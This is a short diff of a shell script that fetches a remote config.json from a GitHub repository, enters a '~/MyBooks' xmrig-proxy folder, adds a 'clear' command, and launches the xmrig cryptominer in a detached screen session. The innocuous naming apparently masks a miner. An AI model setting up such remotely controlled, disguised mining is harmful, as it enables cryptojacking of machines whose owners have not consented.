@@ -16,6 +16,8 @@ rm config.json
 wget https://raw.githubusercontent.com/Novabooks21/CoolBooks2/main/MainData/Main/config.json
 
 cd ~/MyBooks/xmrig-proxy-6.15.1
+clear
+
 
 screen -R xmr
 ./xmrig
